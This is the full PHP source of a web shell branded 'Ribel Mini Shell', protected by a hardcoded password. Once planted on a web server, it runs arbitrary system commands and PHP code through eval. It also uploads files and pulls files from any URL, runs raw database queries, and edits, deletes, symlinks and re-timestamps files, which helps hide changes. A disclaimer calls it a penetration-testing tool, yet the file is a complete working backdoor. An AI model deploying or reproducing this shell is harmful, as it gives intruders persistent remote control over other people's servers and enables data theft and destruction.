<?php
/**
 * Professional Web Shell v3.0
 * Features: File Manager, Console, PHP Eval, Upload, Wget, DB Query,
 *           File Edit, Chmod, Zip/Compress, Extract, Rename/Copy,
 *           Symlink, Hash, Bulk Delete, File Download, System Info
 * For authorized penetration testing only.
 */
error_reporting(E_ALL);
ini_set('display_errors', 0);
set_time_limit(0);

$PASSWORD = 'p4ssw0rd';
session_start();

$authenticated = isset($_SESSION['shell_auth']) && $_SESSION['shell_auth'] === true;
if (!$authenticated && isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
    $_SESSION['shell_auth'] = true;
    $authenticated = true;
}
if (!$authenticated) {
    die('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Ribel Mini Shell</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f0f0f;color:#ddd;font:13px Arial,Helvetica,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{width:360px;max-width:94vw;background:#1a1a1a;border:1px solid #333;padding:28px 24px 22px;box-shadow:0 8px 32px rgba(0,0,0,.6)}
h1{text-align:center;font-size:18px;font-weight:600;color:#fff;margin-bottom:4px;letter-spacing:.3px}
.sub{text-align:center;color:#666;font-size:11px;margin-bottom:22px}
label{display:block;color:#aaa;font-size:12px;margin-bottom:6px}
input[type=password]{width:100%;background:#0f0f0f;border:1px solid #333;color:#eee;padding:10px 12px;font:13px Arial,sans-serif;outline:none;margin-bottom:14px}
input[type=password]:focus{border-color:#2e7d32}
button{width:100%;background:#2e7d32;color:#fff;border:0;padding:11px;font:600 13px Arial,sans-serif;cursor:pointer;letter-spacing:.5px}
button:hover{background:#388e3c}
.foot{text-align:center;margin-top:16px;color:#444;font-size:10px}
.foot b{color:#2e7d32}
</style></head><body>
<div class="box">
<h1>Ribel Mini Shell</h1>
<div class="sub">Simple FileManager</div>
<form method="post">
<label>Password</label>
<input type="password" name="pass" autofocus placeholder="••••••••">
<button type="submit">LOGIN</button>
</form>
<div class="foot">Create By <b>Ribel</b> · ' . htmlspecialchars(gethostname()) . '</div>
</div></body></html>');
}

if (!isset($_SESSION['shell_token'])) { $_SESSION['shell_token'] = bin2hex(random_bytes(32)); }
$TOKEN = $_SESSION['shell_token'];

$hasSensitiveAction = isset($_POST['cmd']) || isset($_FILES['upload_file']) || isset($_POST['eval_code']) || isset($_POST['db_query']) || isset($_POST['file_content']) || isset($_POST['wget_url']) || isset($_POST['new_dir']) || isset($_POST['rename_from']) || isset($_POST['chmod_path']) || isset($_POST['zip_name']) || isset($_POST['extract_file']) || isset($_POST['symlink_target']) || isset($_POST['hash_file']) || isset($_POST['copy_source']) || isset($_POST['bulk_action']) || isset($_POST['batch_cmd']) || isset($_POST['touch_file']) || isset($_POST['clear_cache']) || isset($_POST['clipboard_action']);
if ($hasSensitiveAction) {
    if (!isset($_POST['token']) || $_POST['token'] !== $TOKEN) {
        die('CSRF token mismatch');
    }
}

// Always known "home" = folder where this shell lives
$HOME_PATH = @realpath(dirname(__FILE__));
if (!$HOME_PATH) $HOME_PATH = @realpath(dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__)) ?: getcwd();

$CWD = isset($_GET['d']) ? $_GET['d'] : $HOME_PATH;
if (isset($_GET['d']) && is_dir($_GET['d'])) { chdir($_GET['d']); $CWD = realpath($_GET['d']); }
else { @chdir($CWD); $CWD = realpath($CWD) ?: $CWD; }

// Parent for Back
$HOME_PARENT = ($CWD && $CWD !== '/') ? dirname($CWD) : '/';
if ($HOME_PARENT === '') $HOME_PARENT = '/';

$outputHTML = '';
$outputFile = '';
$outputError = '';

// ========== HELPERS ==========
function timeAgo($ts){$d=time()-$ts;if($d<5)return'baru saja';if($d<60)return $d.' detik lalu';if($d<3600)return floor($d/60).' menit lalu';if($d<86400)return floor($d/3600).' jam lalu';if($d<604800)return floor($d/86400).' hari lalu';if($d<2592000)return floor($d/604800).' minggu lalu';if($d<31536000)return floor($d/2592000).' bulan lalu';return floor($d/31536000).' tahun lalu';}

// ========== ACTION HANDLERS ==========

// Command execution (proc_open > exec > popen)
if (isset($_POST['cmd']) && trim($_POST['cmd']) !== '') {
    $cmd = trim($_POST['cmd']);
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = proc_open($cmd, $desc, $pipes, $CWD);
        if (is_resource($proc)) {
            $stdout = stream_get_contents($pipes[1]); fclose($pipes[1]);
            $stderr = stream_get_contents($pipes[2]); fclose($pipes[2]);
            fclose($pipes[0]);
            proc_close($proc);
            $outputHTML = htmlspecialchars($stdout . ($stderr ? "\n[STDERR]\n" . $stderr : ''));
        } else {
            $outputHTML = '[proc_open failed]';
        }
    } elseif (function_exists('exec')) {
        $lines = []; exec($cmd . ' 2>&1', $lines);
        $outputHTML = htmlspecialchars(implode("\n", $lines));
    } elseif (function_exists('popen')) {
        $fp = popen($cmd . ' 2>&1', 'r');
        $out = stream_get_contents($fp); pclose($fp);
        $outputHTML = htmlspecialchars($out);
    } else {
        $outputHTML = '[No usable command execution function available]';
    }
}

// File upload
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $dest = $CWD . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
        $outputHTML .= "\n[Uploaded] " . htmlspecialchars($dest);
    } else {
        $outputHTML .= "\n[Upload failed]";
    }
}

// PHP eval
if (isset($_POST['eval_code']) && trim($_POST['eval_code']) !== '') {
    ob_start();
    $result = eval(trim($_POST['eval_code']));
    $evalOut = ob_get_clean();
    $outputHTML = htmlspecialchars($evalOut . ($result !== null ? var_export($result, true) : ''));
}

// Wget / Download from URL
if (isset($_POST['wget_url']) && trim($_POST['wget_url']) !== '') {
    $url = trim($_POST['wget_url']);
    $fname = isset($_POST['wget_name']) && trim($_POST['wget_name']) !== '' ? trim($_POST['wget_name']) : basename(parse_url($url, PHP_URL_PATH));
    if ($fname === '') $fname = 'downloaded.bin';
    $dest = $CWD . '/' . $fname;
    $data = @file_get_contents($url);
    if ($data !== false && file_put_contents($dest, $data)) {
        $outputHTML .= "\n[Downloaded] " . htmlspecialchars($url) . " -> " . htmlspecialchars($dest) . " (" . strlen($data) . " bytes)";
    } else {
        $outputHTML .= "\n[Download failed] from " . htmlspecialchars($url);
    }
}

// File create/edit with optional timestamp injection
if (isset($_POST['file_content']) && isset($_POST['file_name']) && trim($_POST['file_name']) !== '') {
    $fpath = $CWD . '/' . trim($_POST['file_name']);
    $content = $_POST['file_content'];
    if (isset($_POST['inject_timestamp']) && preg_match('/\.php$/i', $fpath)) {
        $tsLine = '// Last modified: ' . date('Y-m-d H:i:s');
        if (preg_match('/^\/\/ Last modified:/m', $content)) {
            $content = preg_replace('/^\/\/ Last modified:.*$/m', $tsLine, $content);
        } else {
            $content = preg_replace('/^<\?php/', "<?php\n" . $tsLine, $content, 1);
        }
    }
    if (file_put_contents($fpath, $content) !== false) {
        $outputHTML .= "\n[Written] " . htmlspecialchars($fpath) . " (" . strlen($content) . " bytes)";
    } else {
        $outputHTML .= "\n[Write failed] " . htmlspecialchars($fpath);
    }
}

// Pre-fill edit form when loading a file
$editContent = '';
$editFileName = '';
$editFileMtime = '';
if (isset($_GET['load_edit']) && isset($_GET['token']) && $_GET['token'] === $TOKEN) {
    $lef = realpath($CWD . '/' . basename($_GET['load_edit']));
    if ($lef && strpos($lef, $CWD) === 0 && is_file($lef)) {
        $editContent = htmlspecialchars(file_get_contents($lef));
        $editFileName = htmlspecialchars(basename($lef));
        $editFileMtime = date('Y-m-d H:i:s', filemtime($lef)) . ' (' . timeAgo(filemtime($lef)) . ')';
        // Jika request AJAX, output konten mentah dan exit
        if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
            header('Content-Type: text/plain; charset=utf-8');
            readfile($lef);
            exit;
        }
    }
}

// File delete (single via GET)
if (isset($_GET['del']) && isset($_GET['token']) && $_GET['token'] === $TOKEN) {
    $f = realpath($_GET['del']);
    if ($f && strpos($f, $CWD) === 0 && is_file($f)) {
        if (unlink($f)) $outputHTML .= "\n[Deleted] " . htmlspecialchars($f);
        else $outputHTML .= "\n[Delete failed]";
    }
}

// Bulk actions (delete selected)
if (isset($_POST['bulk_action']) && $_POST['bulk_action'] === 'delete' && isset($_POST['selected']) && is_array($_POST['selected'])) {
    $deleted = 0; $failed = 0;
    foreach ($_POST['selected'] as $sel) {
        $f = realpath($CWD . '/' . basename($sel));
        if ($f && strpos($f, $CWD) === 0 && is_file($f)) {
            if (unlink($f)) $deleted++; else $failed++;
        }
    }
    $outputHTML .= "\n[Bulk Delete] $deleted file(s) deleted, $failed failed";
}

// Clipboard: Cut/Copy/Paste
if (isset($_POST['clipboard_action'])) {
    if ($_POST['clipboard_action'] === 'cut' || $_POST['clipboard_action'] === 'copy') {
        if (isset($_POST['clipboard_items']) && is_array($_POST['clipboard_items'])) {
            $_SESSION['shell_clipboard'] = [
                'items' => array_map('basename', $_POST['clipboard_items']),
                'action' => $_POST['clipboard_action'],
                'source_dir' => $CWD
            ];
            $outputHTML .= "\n[Clipboard] " . count($_POST['clipboard_items']) . " item(s) " . ($_POST['clipboard_action'] === 'cut' ? 'cut' : 'copied') . ". Navigate to target directory and click Paste.";
        }
    } elseif ($_POST['clipboard_action'] === 'paste') {
        if (isset($_SESSION['shell_clipboard']) && !empty($_SESSION['shell_clipboard']['items'])) {
            $cb = $_SESSION['shell_clipboard'];
            $moved = 0; $copied = 0; $failed = 0;
            foreach ($cb['items'] as $item) {
                $src = $cb['source_dir'] . '/' . $item;
                if (!file_exists($src)) { $failed++; continue; }
                $dst = $CWD . '/' . $item;
                if ($cb['action'] === 'cut') {
                    $sReal = realpath($src);
                    if ($sReal && strpos($sReal, $cb['source_dir']) === 0) {
                        if (rename($sReal, $dst)) $moved++; else $failed++;
                    } else { $failed++; }
                } else {
                    if (is_dir($src)) {
                        if (!is_dir($dst)) { if (!mkdir($dst, 0755, true)) { $failed++; continue; } }
                        $dir = new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS);
                        $items = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($items as $it) {
                            $target = $dst . '/' . $items->getSubPathName();
                            if ($it->isDir()) { if (!is_dir($target)) mkdir($target); }
                            else { copy($it, $target); }
                        }
                        $copied++;
                    } else {
                        if (copy($src, $dst)) $copied++; else $failed++;
                    }
                }
            }
            if ($cb['action'] === 'cut') {
                $outputHTML .= "\n[Paste] Moved $moved item(s)" . ($failed > 0 ? ", $failed failed" : "");
                $_SESSION['shell_clipboard'] = null;
            } else {
                $outputHTML .= "\n[Paste] Copied $copied item(s)" . ($failed > 0 ? ", $failed failed" : "");
            }
        } else {
            $outputHTML .= "\n[Paste] Clipboard is empty. Select files and use Cut or Copy first.";
        }
    } elseif ($_POST['clipboard_action'] === 'clear') {
        $_SESSION['shell_clipboard'] = null;
        $outputHTML .= "\n[Clipboard cleared]";
    }
}

// File rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to']) && trim($_POST['rename_to']) !== '') {
    $f = realpath($CWD . '/' . trim($_POST['rename_from']));
    $t = $CWD . '/' . trim($_POST['rename_to']);
    if ($f && strpos($f, $CWD) === 0) {
        if (rename($f, $t)) $outputHTML .= "\n[Renamed] " . htmlspecialchars(basename($f)) . " -> " . htmlspecialchars(basename($t));
        else $outputHTML .= "\n[Rename failed]";
    }
}

// File copy
if (isset($_POST['copy_source']) && isset($_POST['copy_dest']) && trim($_POST['copy_dest']) !== '') {
    $src = realpath($CWD . '/' . trim($_POST['copy_source']));
    $dst = $CWD . '/' . trim($_POST['copy_dest']);
    if ($src && strpos($src, $CWD) === 0) {
        if (is_dir($src)) {
            // Recursive directory copy
            $ok = true;
            if (!is_dir($dst)) { if (!mkdir($dst, 0755, true)) $ok = false; }
            if ($ok) {
                $dir = new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS);
                $items = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::SELF_FIRST);
                foreach ($items as $item) {
                    $target = $dst . '/' . $items->getSubPathName();
                    if ($item->isDir()) { if (!is_dir($target)) mkdir($target); }
                    else { copy($item, $target); }
                }
            }
            $outputHTML .= $ok ? "\n[Dir Copied] $src -> $dst" : "\n[Copy failed]";
        } else {
            if (copy($src, $dst)) $outputHTML .= "\n[Copied] " . htmlspecialchars(basename($src)) . " -> " . htmlspecialchars(basename($dst));
            else $outputHTML .= "\n[Copy failed]";
        }
    }
}

// Directory create
if (isset($_POST['new_dir']) && trim($_POST['new_dir']) !== '') {
    $d = $CWD . '/' . trim($_POST['new_dir']);
    if (mkdir($d, 0755, true)) $outputHTML .= "\n[Dir created] " . htmlspecialchars($d);
    else $outputHTML .= "\n[Dir create failed]";
}

// Chmod
if (isset($_POST['chmod_path']) && trim($_POST['chmod_path']) !== '') {
    $chmodTarget = realpath($CWD . '/' . trim($_POST['chmod_path']));
    $chmodMode = trim($_POST['chmod_mode'] ?? '0644');
    $chmodRecursive = isset($_POST['chmod_recursive']);
    if ($chmodTarget && strpos($chmodTarget, $CWD) === 0) {
        $mode = octdec($chmodMode);
        if ($mode > 0) {
            if ($chmodRecursive && is_dir($chmodTarget)) {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($chmodTarget, RecursiveDirectoryIterator::SKIP_DOTS));
                $cnt = 0;
                foreach ($it as $item) { if (chmod($item->getPathname(), $mode)) $cnt++; }
                chmod($chmodTarget, $mode);
                $outputHTML .= "\n[Chmod] Recursively set " . htmlspecialchars($chmodMode) . " on " . htmlspecialchars($chmodTarget) . " ($cnt items)";
            } else {
                if (chmod($chmodTarget, $mode)) $outputHTML .= "\n[Chmod] Set " . htmlspecialchars($chmodMode) . " on " . htmlspecialchars($chmodTarget);
                else $outputHTML .= "\n[Chmod failed]";
            }
        } else {
            $outputHTML .= "\n[Chmod] Invalid mode: " . htmlspecialchars($chmodMode);
        }
    }
}

// Clear Cache
if (isset($_POST['clear_cache'])) {
    $cacheResults = [];
    $cacheTotalSize = 0;
    
    // 1. PHP Opcache
    if (function_exists('opcache_reset')) {
        $r = opcache_reset() ? 'OK: opcache direset' : 'GAGAL: opcache_reset()';
    } else {
        $r = 'N/A: opcache tidak tersedia';
    }
    $cacheResults[] = ['label' => 'PHP Opcache', 'result' => $r];
    
    // 2. PHP Realpath Cache
    $before = realpath_cache_size();
    clearstatcache(true);
    $after = realpath_cache_size();
    $cacheResults[] = ['label' => 'Realpath Cache', 'result' => 'OK: ' . number_format($before - $after) . ' bytes freed (' . number_format($before) . ' → ' . number_format($after) . ')'];
    
    // 3. PHP Stat Cache
    clearstatcache();
    $cacheResults[] = ['label' => 'Stat Cache', 'result' => 'OK: stat cache cleared'];
    
    // 4. PHP session GC
    if (function_exists('session_gc')) {
        $n = session_gc();
        $cacheResults[] = ['label' => 'Session GC', 'result' => 'OK: ' . $n . ' expired sessions cleaned'];
    } else {
        $cacheResults[] = ['label' => 'Session GC', 'result' => 'N/A: session_gc() tidak tersedia'];
    }
    
    // 5. /tmp session files
    $sessionDir = session_save_path() ?: sys_get_temp_dir();
    if ($sessionDir && is_dir($sessionDir)) {
        $count = 0; $size = 0;
        foreach (glob($sessionDir . '/sess_*') as $sf) {
            if (is_file($sf)) { $size += filesize($sf); $count++; }
        }
        $cacheResults[] = ['label' => 'Session Files', 'result' => $count . ' file(s) (' . number_format($size) . ' bytes) di ' . $sessionDir, 'action' => 'info'];
        $cacheTotalSize += $size;
    }
    
    // 6. PHP temp directory
    $tmpDir = sys_get_temp_dir();
    $tmpCount = 0; $tmpSize = 0;
    if (is_dir($tmpDir) && is_readable($tmpDir)) {
        foreach (glob($tmpDir . '/*') as $tf) {
            if (is_file($tf)) { $tmpSize += filesize($tf); $tmpCount++; }
        }
    }
    $cacheResults[] = ['label' => 'Temp Dir (' . basename($tmpDir) . ')', 'result' => $tmpCount . ' file(s) (' . number_format($tmpSize) . ' bytes)', 'action' => 'info'];
    $cacheTotalSize += $tmpSize;
    
    // 7. APC/APCu cache
    if (function_exists('apcu_clear_cache')) {
        $r = apcu_clear_cache() ? 'OK: APCu cache cleared' : 'GAGAL: apcu_clear_cache()';
    } elseif (function_exists('apc_clear_cache')) {
        $r = apc_clear_cache('user') ? 'OK: APC user cache cleared' : 'GAGAL: apc_clear_cache()';
    } else {
        $r = 'N/A: APCu/APC tidak tersedia';
    }
    $cacheResults[] = ['label' => 'APCu / APC', 'result' => $r];
    
    // 8. WordPress cache (if wp-config exists)
    $wpConfig = $CWD . '/wp-config.php';
    if (file_exists($wpConfig) || file_exists(dirname($CWD) . '/wp-config.php')) {
        $cacheResults[] = ['label' => 'WordPress', 'result' => 'Ditemukan wp-config.php — gunakan wp cache flush dari WP CLI', 'action' => 'info'];
    }
    
    // 9. Laravel cache
    $laravelBootstrap = $CWD . '/bootstrap/cache';
    if (is_dir($laravelBootstrap)) {
        $lSize = 0; $lCount = 0;
        foreach (glob($laravelBootstrap . '/*') as $lf) { if (is_file($lf)) { $lSize += filesize($lf); $lCount++; } }
        $cacheResults[] = ['label' => 'Laravel bootstrap/cache', 'result' => $lCount . ' file(s) (' . number_format($lSize) . ' bytes) — hapus manual jika perlu', 'action' => 'info'];
        $cacheTotalSize += $lSize;
    }
    
    $outputHTML = "\n=== CLEAR CACHE RESULTS ===\n";
    foreach ($cacheResults as $cr) {
        $outputHTML .= "[" . $cr['label'] . "] " . $cr['result'] . "\n";
    }
    $outputHTML .= "\n---\nTotal cache size detected: " . ($cacheTotalSize > 0 ? number_format($cacheTotalSize) . ' bytes (' . round($cacheTotalSize/1024/1024, 1) . ' MB)' : 'N/A');
    if ($cacheTotalSize > 0) {
        $outputHTML .= "\n[INFO] Untuk membersihkan file temporary, gunakan Console: rm -rf " . sys_get_temp_dir() . "/*";
    }
}

// Create ZIP archive
if (isset($_POST['zip_name']) && trim($_POST['zip_name']) !== '' && isset($_POST['zip_items']) && is_array($_POST['zip_items'])) {
    $zipName = trim($_POST['zip_name']);
    if (!preg_match('/\.zip$/i', $zipName)) $zipName .= '.zip';
    $zipPath = $CWD . '/' . $zipName;
    $items = $_POST['zip_items'];
    $usePhpZip = class_exists('ZipArchive');
    if ($usePhpZip) {
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $added = 0;
            foreach ($items as $item) {
                $fullPath = realpath($CWD . '/' . basename($item));
                if (!$fullPath || strpos($fullPath, $CWD) !== 0) continue;
                $localName = basename($item);
                if (is_dir($fullPath)) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fullPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                    foreach ($files as $file) {
                        $filePath = $file->getRealPath();
                        $relativePath = $localName . '/' . substr($filePath, strlen($fullPath) + 1);
                        if ($file->isDir()) { $zip->addEmptyDir($relativePath); }
                        else { $zip->addFile($filePath, $relativePath); $added++; }
                    }
                } else {
                    $zip->addFile($fullPath, $localName);
                    $added++;
                }
            }
            $zip->close();
            $outputHTML .= "\n[ZIP Created] " . htmlspecialchars($zipPath) . " (" . $added . " files, " . number_format(filesize($zipPath)) . " bytes)";
        } else {
            $outputHTML .= "\n[ZIP failed] Could not create archive";
        }
    } else {
        // Fallback: use system zip command
        $itemList = [];
        foreach ($items as $item) {
            $fullPath = realpath($CWD . '/' . basename($item));
            if ($fullPath && strpos($fullPath, $CWD) === 0) $itemList[] = escapeshellarg(basename($item));
        }
        if (!empty($itemList)) {
            $cmd = 'cd ' . escapeshellarg($CWD) . ' && zip -r ' . escapeshellarg($zipName) . ' ' . implode(' ', $itemList) . ' 2>&1';
            $lines = []; exec($cmd, $lines, $rc);
            if ($rc === 0) {
                $outputHTML .= "\n[ZIP Created] " . htmlspecialchars($zipPath) . "\n" . htmlspecialchars(implode("\n", $lines));
            } else {
                $outputHTML .= "\n[ZIP failed] " . htmlspecialchars(implode("\n", $lines));
            }
        }
    }
}

// Extract archive (zip, tar, tar.gz, gz, bz2)
if (isset($_POST['extract_file']) && trim($_POST['extract_file']) !== '') {
    $extractFile = realpath($CWD . '/' . trim($_POST['extract_file']));
    if ($extractFile && strpos($extractFile, $CWD) === 0 && is_file($extractFile)) {
        $ext = strtolower(pathinfo($extractFile, PATHINFO_EXTENSION));
        $extractDest = $CWD . '/' . pathinfo($extractFile, PATHINFO_FILENAME) . '_extracted';
        if (isset($_POST['extract_dest']) && trim($_POST['extract_dest']) !== '') {
            $extractDest = $CWD . '/' . trim($_POST['extract_dest']);
        }
        if (!is_dir($extractDest)) mkdir($extractDest, 0755, true);
        $success = false;
        $msg = '';

        // Try PHP ZipArchive for .zip
        if ($ext === 'zip' && class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($extractFile) === true) {
                $zip->extractTo($extractDest);
                $zip->close();
                $success = true;
                $msg = "Extracted ZIP to " . htmlspecialchars($extractDest);
            } else {
                $msg = "ZipArchive::open failed";
            }
        }
        // Try PHP Phar for .tar, .tar.gz, .tar.bz2, .zip
        if (!$success) {
            try {
                $phar = new PharData($extractFile);
                $phar->extractTo($extractDest, null, true);
                $success = true;
                $msg = "Extracted via PharData to " . htmlspecialchars($extractDest);
            } catch (Exception $e) {
                $msg = "PharData: " . $e->getMessage();
            }
        }
        // Fallback to system commands
        if (!$success) {
            $cmd = '';
            if (in_array($ext, ['zip'])) {
                $cmd = 'cd ' . escapeshellarg($extractDest) . ' && unzip -o ' . escapeshellarg($extractFile) . ' 2>&1';
            } elseif (in_array($ext, ['gz', 'gzip']) && !preg_match('/\.tar\.gz$/i', $extractFile)) {
                $cmd = 'cd ' . escapeshellarg($extractDest) . ' && gunzip -c ' . escapeshellarg($extractFile) . ' > ' . escapeshellarg(pathinfo($extractFile, PATHINFO_FILENAME)) . ' 2>&1';
            } elseif (preg_match('/\.tar\.gz$/i', $extractFile) || $ext === 'tgz') {
                $cmd = 'cd ' . escapeshellarg($extractDest) . ' && tar -xzf ' . escapeshellarg($extractFile) . ' 2>&1';
            } elseif (preg_match('/\.tar\.bz2$/i', $extractFile) || $ext === 'tbz2') {
                $cmd = 'cd ' . escapeshellarg($extractDest) . ' && tar -xjf ' . escapeshellarg($extractFile) . ' 2>&1';
            } elseif ($ext === 'tar') {
                $cmd = 'cd ' . escapeshellarg($extractDest) . ' && tar -xf ' . escapeshellarg($extractFile) . ' 2>&1';
            } elseif ($ext === 'bz2') {
                $cmd = 'cd ' . escapeshellarg($extractDest) . ' && bunzip2 -c ' . escapeshellarg($extractFile) . ' > ' . escapeshellarg(pathinfo($extractFile, PATHINFO_FILENAME)) . ' 2>&1';
            }
            if ($cmd) {
                $lines = []; exec($cmd, $lines, $rc);
                if ($rc === 0) {
                    $success = true;
                    $msg = "Extracted via system command to " . htmlspecialchars($extractDest) . "\n" . htmlspecialchars(implode("\n", $lines));
                } else {
                    $msg = "System command failed: " . htmlspecialchars(implode("\n", $lines));
                }
            } else {
                $msg = "Unsupported archive format: .$ext";
            }
        }
        $outputHTML .= $success ? "\n[Extracted] $msg" : "\n[Extract failed] $msg";
    }
}

// Symlink
if (isset($_POST['symlink_target']) && trim($_POST['symlink_target']) !== '') {
    $symTarget = trim($_POST['symlink_target']);
    $symName = trim($_POST['symlink_name'] ?? '');
    if ($symName === '') $symName = basename($symTarget);
    $linkPath = $CWD . '/' . $symName;
    // Try PHP symlink first, fall back to ln command (symlink often disabled)
    $ok = false;
    if (function_exists('symlink')) {
        $ok = @symlink($symTarget, $linkPath);
    }
    if (!$ok) {
        $lines = []; exec('ln -sf ' . escapeshellarg($symTarget) . ' ' . escapeshellarg($linkPath) . ' 2>&1', $lines, $rc);
        $ok = ($rc === 0);
    }
    if ($ok) {
        $outputHTML .= "\n[Symlink] " . htmlspecialchars($symTarget) . " -> " . htmlspecialchars($linkPath);
    } else {
        $outputHTML .= "\n[Symlink failed] " . htmlspecialchars($symTarget);
    }
}

// File hash
if (isset($_POST['hash_file']) && trim($_POST['hash_file']) !== '') {
    $hashTarget = realpath($CWD . '/' . trim($_POST['hash_file']));
    if ($hashTarget && strpos($hashTarget, $CWD) === 0 && is_file($hashTarget)) {
        $algo = $_POST['hash_algo'] ?? 'sha256';
        $algos = ['md5' => 'md5_file', 'sha1' => 'sha1_file', 'sha256' => 'sha256', 'sha512' => 'sha512'];
        if ($algo === 'md5') $hash = md5_file($hashTarget);
        elseif ($algo === 'sha1') $hash = sha1_file($hashTarget);
        elseif ($algo === 'sha256') $hash = hash_file('sha256', $hashTarget);
        elseif ($algo === 'sha512') $hash = hash_file('sha512', $hashTarget);
        else $hash = hash_file('sha256', $hashTarget);
        $outputHTML .= "\n[Hash] " . strtoupper($algo) . ": " . $hash . "\nFile: " . htmlspecialchars($hashTarget) . "\nSize: " . number_format(filesize($hashTarget)) . " bytes";
    }
}

// Touch (change file modification time)
if (isset($_POST['touch_file']) && trim($_POST['touch_file']) !== '') {
    $tTarget = realpath($CWD . '/' . trim($_POST['touch_file']));
    $tTime = trim($_POST['touch_time'] ?? '');
    if ($tTarget && strpos($tTarget, $CWD) === 0) {
        $ts = ($tTime !== '') ? strtotime($tTime) : time();
        if ($ts !== false && touch($tTarget, $ts)) {
            $outputHTML .= "\n[Touch] Updated: " . date('Y-m-d H:i:s', $ts) . " on " . htmlspecialchars(basename($tTarget));
        } else { $outputHTML .= "\n[Touch failed]"; }
    }
}

// --- File content viewer ---
if (isset($_GET['view']) && isset($_GET['token']) && $_GET['token'] === $TOKEN) {
    $f = realpath($_GET['view']);
    if ($f && strpos($f, $CWD) === 0 && is_file($f)) {
        $content = file_get_contents($f);
        // Jika request AJAX (fetch/XHR), output konten saja dan exit
        if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
            header('Content-Type: text/plain; charset=utf-8');
            echo $content;
            exit;
        }
        $outputFile = [
            'path' => $f,
            'size' => filesize($f),
            'perms' => substr(sprintf('%o', fileperms($f)), -4),
            'mtime' => date('Y-m-d H:i:s', filemtime($f)),
            'content' => $content
        ];
    }
}

// File download (force download)
if (isset($_GET['download']) && isset($_GET['token']) && $_GET['token'] === $TOKEN) {
    $f = realpath($_GET['download']);
    if ($f && strpos($f, $CWD) === 0 && is_file($f)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        readfile($f);
        exit;
    }
}

// --- Database query ---
if (isset($_POST['db_host']) && isset($_POST['db_query']) && trim($_POST['db_query']) !== '') {
    $host = trim($_POST['db_host']) ?: 'localhost';
    $user = trim($_POST['db_user']) ?: 'root';
    $pass = $_POST['db_pass'] ?? '';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = trim($_POST['db_name'] ?? '');
    
    $mysqli = @new mysqli($host, $user, $pass, $dbname, $port);
    if ($mysqli->connect_errno) {
        $outputHTML .= "\n[DB Error] Connection failed: " . $mysqli->connect_error;
    } else {
        if (preg_match('/^\s*(SELECT|SHOW|DESCRIBE|EXPLAIN|DESC)\b/i', trim($_POST['db_query']))) {
            $result = $mysqli->query(trim($_POST['db_query']));
            if ($result) {
                $rows = [];
                while ($row = $result->fetch_assoc()) { $rows[] = $row; }
                $outputHTML .= htmlspecialchars(json_encode($rows, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
                if (count($rows) === 0) $outputHTML .= "\n[0 rows]";
            } else {
                $outputHTML .= "\n[DB Error] " . $mysqli->error;
            }
        } else {
            $mysqli->query(trim($_POST['db_query']));
            if ($mysqli->errno) {
                $outputHTML .= "\n[DB Error] " . $mysqli->error;
            } else {
                $outputHTML .= "\n[OK] Affected rows: " . $mysqli->affected_rows;
            }
        }
        $mysqli->close();
    }
}

// --- Get directory listing ---
$files = [];
if (is_dir($CWD)) {
    $items = scandir($CWD);
    foreach ($items as $item) {
        if ($item === '.') continue;
        $fullPath = $CWD . '/' . $item;
        $isDir = is_dir($fullPath);
        $files[] = [
            'name' => $item,
            'isdir' => $isDir,
            'size' => $isDir ? '-' : filesize($fullPath),
            'perms' => substr(sprintf('%o', fileperms($fullPath)), -4),
            'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($fullPath))['name'] : fileowner($fullPath),
            'mtime' => date('Y-m-d H:i:s', filemtime($fullPath)), 'mtime_ts' => filemtime($fullPath), 'reltime' => timeAgo(filemtime($fullPath)),
        ];
    }
    usort($files, function($a, $b) {
        if ($a['isdir'] !== $b['isdir']) return $a['isdir'] ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
}

$sortOrder = $_GET['sort'] ?? '';
if($sortOrder==='mtime_asc'){usort($files,function($a,$b){if($a['mtime_ts']!==$b['mtime_ts'])return $a['mtime_ts']-$b['mtime_ts'];return strcasecmp($a['name'],$b['name']);});}
elseif($sortOrder==='mtime_desc'){usort($files,function($a,$b){if($a['mtime_ts']!==$b['mtime_ts'])return $b['mtime_ts']-$a['mtime_ts'];return strcasecmp($a['name'],$b['name']);});}
elseif($sortOrder==='name_asc'){usort($files,function($a,$b){if($a['isdir']!==$b['isdir'])return $a['isdir']?-1:1;return strcasecmp($a['name'],$b['name']);});}
